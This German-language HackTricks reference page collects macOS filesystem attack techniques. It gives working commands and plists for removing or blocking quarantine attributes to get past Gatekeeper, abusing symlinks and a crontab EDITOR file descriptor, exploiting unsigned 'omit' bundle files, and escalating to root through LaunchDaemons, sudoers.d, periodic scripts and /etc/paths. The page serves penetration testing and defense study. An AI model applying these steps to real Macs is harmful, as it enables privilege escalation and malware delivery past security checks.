# macOS FS Tricks

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **GitHub-Repositories** senden.

</details>

## POSIX-Berechtigungskombinationen

Berechtigungen in einem **Verzeichnis**:

* **Lesen** - Sie können die Verzeichniseinträge **auflisten**
* **Schreiben** - Sie können **Dateien** im Verzeichnis **löschen/schreiben** und Sie können **leere Ordner löschen**.&#x20;
* Sie können jedoch **nicht nicht-leere Ordner löschen/ändern**, es sei denn, Sie haben Schreibberechtigungen dafür.
* Sie können den **Namen eines Ordners nicht ändern**, es sei denn, Sie besitzen ihn.
* **Ausführen** - Sie dürfen das Verzeichnis **durchsuchen** - wenn Sie dieses Recht nicht haben, können Sie nicht auf Dateien darin oder in Unterverzeichnissen zugreifen.

### Gefährliche Kombinationen

**Wie man eine von root besitzte Datei/Ordner überschreibt**, aber:

* Ein Eltern-**Verzeichnisbesitzer** im Pfad ist der Benutzer
* Ein Eltern-**Verzeichnisbesitzer** im Pfad ist eine **Benutzergruppe** mit **Schreibzugriff**
* Eine **Benutzergruppe** hat **Schreibzugriff** auf die **Datei**

Mit einer dieser Kombinationen könnte ein Angreifer einen **symmetrischen/harten Link** in den erwarteten Pfad einfügen, um einen privilegierten beliebigen Schreibzugriff zu erlangen.

### Spezialfall Ordner root R+X

Wenn sich Dateien in einem **Verzeichnis** befinden, auf das **nur root Lese- und Ausführungszugriff hat**, sind diese für niemanden sonst **zugänglich**. Daher könnte eine Schwachstelle, die es ermöglicht, eine von einem Benutzer lesbare Datei, die aufgrund dieser **Einschränkung** nicht gelesen werden kann, von diesem Ordner **in einen anderen** zu verschieben, missbraucht werden, um diese Dateien zu lesen.

Beispiel unter: [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions)

## Symbolischer Link / Harter Link

Wenn ein privilegierter Prozess Daten in einer **Datei** schreibt, die von einem **weniger privilegierten Benutzer kontrolliert** werden kann oder die von einem weniger privilegierten Benutzer **zuvor erstellt** wurde, kann der Benutzer diese einfach über einen symbolischen oder harten Link auf eine andere Datei verweisen, und der privilegierte Prozess wird in diese Datei schreiben.

Überprüfen Sie in den anderen Abschnitten, wo ein Angreifer einen **beliebigen Schreibzugriff missbrauchen könnte, um Privilegien zu eskalieren**.

## .fileloc

Dateien mit der Erweiterung **`.fileloc`** können auf andere Anwendungen oder Binärdateien verweisen, sodass beim Öffnen dieser Dateien die Anwendung/Binärdatei ausgeführt wird.\
Beispiel:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## Beliebige FD

Wenn Sie einen Prozess dazu bringen können, eine Datei oder einen Ordner mit hohen Berechtigungen zu öffnen, können Sie **`crontab`** missbrauchen, um eine Datei in `/etc/sudoers.d` mit **`EDITOR=exploit.py`** zu öffnen. Dadurch erhält `exploit.py` den FD zur Datei innerhalb von `/etc/sudoers` und missbraucht sie.

Zum Beispiel: [https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098)

## Tricks zum Entfernen von Quarantäne-xattrs

### Entfernen Sie es
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable Flag

Wenn eine Datei/ein Ordner dieses unveränderliche Attribut hat, ist es nicht möglich, ein xattr darauf zu setzen.
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### defvfs mount

Ein **devfs**-Mount unterstützt **keine xattr**, weitere Informationen finden Sie unter [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)
```bash
mkdir /tmp/mnt
mount_devfs -o noowners none "/tmp/mnt"
chmod 777 /tmp/mnt
mkdir /tmp/mnt/lol
xattr -w com.apple.quarantine "" /tmp/mnt/lol
xattr: [Errno 1] Operation not permitted: '/tmp/mnt/lol'
```
### writeextattr ACL

Diese ACL verhindert das Hinzufügen von `xattrs` zu der Datei.
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

Das Dateiformat **AppleDouble** kopiert eine Datei einschließlich ihrer ACEs.

Im [**Quellcode**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) ist zu sehen, dass die ACL-Textdarstellung, die im xattr mit dem Namen **`com.apple.acl.text`** gespeichert ist, als ACL in der dekomprimierten Datei festgelegt wird. Wenn Sie also eine Anwendung in eine Zip-Datei mit dem Dateiformat **AppleDouble** komprimieren und eine ACL festlegen, die das Schreiben anderer xattrs verhindert... wird der Quarantäne-xattr nicht in die Anwendung übertragen:

Weitere Informationen finden Sie im [**ursprünglichen Bericht**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/).

Um dies zu replizieren, müssen wir zuerst den richtigen ACL-String erhalten:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Hinweis: Auch wenn dies funktioniert, schreibt die Sandbox das Quarantäne-xattr zuerst)

Nicht wirklich notwendig, aber ich lasse es trotzdem hier:

{% content-ref url="macos-xattr-acls-extra-stuff.md" %}
[macos-xattr-acls-extra-stuff.md](macos-xattr-acls-extra-stuff.md)
{% endcontent-ref %}

## Umgehung von Code-Signaturen

Bundles enthalten die Datei **`_CodeSignature/CodeResources`**, die den **Hash-Wert** jeder einzelnen **Datei** im **Bundle** enthält. Beachten Sie, dass der Hash-Wert von CodeResources auch im ausführbaren Code eingebettet ist, sodass wir damit nicht herumspielen können.

Es gibt jedoch einige Dateien, deren Signatur nicht überprüft wird. Diese haben den Schlüssel "omit" in der Plist, wie:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
Es ist möglich, die Signatur einer Ressource über die Befehlszeile mit folgendem Befehl zu berechnen:

{% code overflow="wrap" %}
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
{% endcode %}

## Dmg-Dateien mounten

Ein Benutzer kann eine benutzerdefinierte Dmg-Datei erstellen und sogar über vorhandenen Ordnern platzieren. So können Sie eine benutzerdefinierte Dmg-Datei mit benutzerdefiniertem Inhalt erstellen:

{% code overflow="wrap" %}
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
{% endcode %}

## Beliebige Schreibvorgänge

### Periodische sh-Skripte

Wenn Ihr Skript als **Shell-Skript** interpretiert werden kann, können Sie das **`/etc/periodic/daily/999.local`** Shell-Skript überschreiben, das jeden Tag ausgeführt wird.

Sie können die Ausführung dieses Skripts mit dem Befehl **`sudo periodic daily`** simulieren.

### Daemons

Schreiben Sie einen beliebigen **LaunchDaemon** wie **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** mit einer Plist, die ein beliebiges Skript ausführt, z.B.:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
Generieren Sie das Skript `/Applications/Scripts/privesc.sh` mit den **Befehlen**, die Sie als Root ausführen möchten.

### Sudoers-Datei

Wenn Sie **beliebig schreiben** können, können Sie eine Datei im Ordner **`/etc/sudoers.d/`** erstellen, um sich selbst **sudo**-Berechtigungen zu gewähren.

### PATH-Dateien

Die Datei **`/etc/paths`** ist einer der Hauptorte, an denen die PATH-Umgebungsvariable festgelegt wird. Sie müssen Root-Rechte haben, um sie zu überschreiben, aber wenn ein Skript von einem **privilegierten Prozess** ausgeführt wird und einen **Befehl ohne vollständigen Pfad** ausführt, könnten Sie ihn möglicherweise **übernehmen**, indem Sie diese Datei ändern.

&#x20;Sie können auch Dateien in **`/etc/paths.d`** schreiben, um neue Ordner in die `PATH`-Umgebungsvariable zu laden.

## Referenzen

* [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/)

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie Pull Requests an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) **und** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **GitHub-Repositories senden.**

</details>
